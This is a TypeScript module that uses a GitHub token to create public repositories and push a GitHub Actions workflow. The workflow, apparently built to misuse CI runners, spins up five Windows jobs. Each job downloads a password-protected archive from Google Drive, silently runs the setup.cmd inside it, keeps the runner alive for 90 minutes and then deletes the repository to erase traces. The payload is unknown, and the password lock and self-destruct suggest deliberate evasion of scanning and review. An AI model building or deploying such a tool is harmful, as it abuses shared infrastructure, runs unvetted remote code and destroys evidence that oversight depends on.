import sodium from 'libsodium-wrappers';

// Helper function for base64 encoding that works in both browser and Node.js
const toBase64 = (str: string): string => {
    // Check if we are in a browser environment
    if (typeof window !== 'undefined' && typeof window.btoa === 'function') {
        // The btoa function in browsers does not correctly handle multi-byte characters.
        // The "unescape(encodeURIComponent(str))" trick is a common way to encode UTF-8 strings to Base64.
        return window.btoa(unescape(encodeURIComponent(str)));
    } 
    // Check if we are in a Node.js environment
    // FIX: Access `Buffer` via `globalThis` to avoid TypeScript errors when Node.js types are not available.
    else if (typeof (globalThis as any).Buffer === 'function') {
        // Node.js's Buffer.from correctly handles UTF-8 strings by default.
        return (globalThis as any).Buffer.from(str, 'utf-8').toString('base64');
    } 
    // Fallback or error for unsupported environments
    else {
        throw new Error('Unable to perform base64 encoding in this environment.');
    }
};

// FIX: Corrected PowerShell command quoting to avoid an unescaped backtick (`), which was breaking the template literal.
export const WORKFLOW_CONTENT = `
name: Create 5 Instances and Self-Destruct

on:
  push:
    branches: [main]
  workflow_dispatch:
  repository_dispatch:
    types: [create-vps]

jobs:
  start-vps:
    runs-on: windows-latest
    strategy:
      matrix:
        vps_index: [1, 2, 3, 4, 5]

    env:
      GDRIVE_ID: 1CVhKw0vDBod4BpDOQRlOUXKtelJs_GEg
      DELETE_TOKEN: \${{ secrets.DELETE_TOKEN }}
      GITHUB_REPOSITORY: \${{ github.repository }}

    steps:
      - name: Run Setup, Keep Alive, and Self-Destruct
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"
          
          echo "Installing dependencies..."
          choco install python -y --no-progress
          python -m pip install gdown -q
          choco install 7zip -y --no-progress
          echo "Dependencies installed successfully."

          echo "Downloading setup file from Google Drive..."
          gdown "$env:GDRIVE_ID" -O setup.rar
          if (-not (Test-Path "setup.rar")) {
            throw "Failed to download setup.rar"
          }
          echo "Download complete."

          $out = "$env:RUNNER_TEMP\\setup"
          New-Item -ItemType Directory -Path $out -Force
          
          echo "Extracting setup.rar..."
          7z x setup.rar -p"hcxhcx" -o"$out" -y
          echo "Extraction complete."

          cd $out
          if (Test-Path ".\\setup.cmd") {
            echo "Executing setup.cmd in the background..."
            Start-Process -FilePath "cmd.exe" -ArgumentList '/c "setup.cmd > NUL 2>&1"'
          } else {
            echo "Warning: setup.cmd not found in the archive."
          }
          
          echo "Setup started in the background. Keeping runner alive for 90 minutes before self-destruct."
          for ($i = 1; $i -le 90; $i++) {
            $remaining = 90 - $i
            echo "Pending commit $i/90. Self-destruct in approximately $remaining minute(s)..."
            Start-Sleep -Seconds 60
          }

          echo "Timer finished. Deleting repository..."
          $headers = @{
            "Authorization" = "token $env:DELETE_TOKEN"
            "Accept" = "application/vnd.github.v3+json"
          }
          Invoke-RestMethod -Uri "https://api.github.com/repos/$env:GITHUB_REPOSITORY" -Method Delete -Headers $headers
          echo "Repository deletion request sent."
`;

const GITHUB_API_URL = 'https://api.github.com';

const getHeaders = (pat: string) => {
  return {
    'Authorization': `Bearer ${pat}`,
    'Accept': 'application/vnd.github.v3+json',
    'X-GitHub-Api-Version': '2022-11-28'
  };
};

// FIX: Removed trailing comma from the generic type parameter list, which was a syntax error.
async function handleResponse<T>(response: Response): Promise<T> {
  if (!response.ok) {
    const errorData = await response.json().catch(() => ({ message: response.statusText }));
    throw new Error(errorData.message || `HTTP error! status: ${response.status}`);
  }
  // For 204 No Content responses, which can happen on success
  if (response.status === 204 || response.status === 201) {
    // try to get json, but if it fails, return an empty object
    return response.json().catch(() => ({})) as Promise<T>;
  }
  return response.json() as Promise<T>;
}


export const getAuthenticatedUser = async (pat: string): Promise<string> => {
  const response = await fetch(`${GITHUB_API_URL}/user`, {
    headers: getHeaders(pat),
  });
  const data = await handleResponse<{ login: string }>(response);
  return data.login;
};

export const createRepo = async (pat:string, repoName: string): Promise<void> => {
    const response = await fetch(`${GITHUB_API_URL}/user/repos`, {
        method: 'POST',
        headers: getHeaders(pat),
        body: JSON.stringify({
            name: repoName,
            description: 'Repository automatically created for workflow.',
            private: false,
            auto_init: true, // Creates a repo with a README
        }),
    });
    await handleResponse(response);
}

const getRepoPublicKey = async (pat: string, owner: string, repo: string): Promise<{ key_id: string; key: string }> => {
    const response = await fetch(`${GITHUB_API_URL}/repos/${owner}/${repo}/actions/secrets/public-key`, {
        headers: getHeaders(pat),
    });
    return handleResponse(response);
};

export const createRepoSecret = async (pat: string, owner: string, repo: string, secretName: string, secretValue: string): Promise<void> => {
    const { key_id, key } = await getRepoPublicKey(pat, owner, repo);

    await sodium.ready;
    const binkey = sodium.from_base64(key, sodium.base64_variants.ORIGINAL);
    const binsec = sodium.from_string(secretValue);
    
    const encBytes = sodium.crypto_box_seal(binsec, binkey);
    const encryptedValue = sodium.to_base64(encBytes, sodium.base64_variants.ORIGINAL);

    await fetch(`${GITHUB_API_URL}/repos/${owner}/${repo}/actions/secrets/${secretName}`, {
        method: 'PUT',
        headers: getHeaders(pat),
        body: JSON.stringify({
            encrypted_value: encryptedValue,
            key_id: key_id,
        }),
    });
};

export const createOrUpdateFile = async (
  pat: string,
  owner: string,
  repo: string,
  path: string,
  content: string,
  message: string
): Promise<void> => {
    const url = `${GITHUB_API_URL}/repos/${owner}/${repo}/contents/${path}`;
    
    const response = await fetch(url, {
        method: 'PUT',
        headers: getHeaders(pat),
        body: JSON.stringify({
            message,
            content: toBase64(content),
        }),
    });

    await handleResponse(response);
};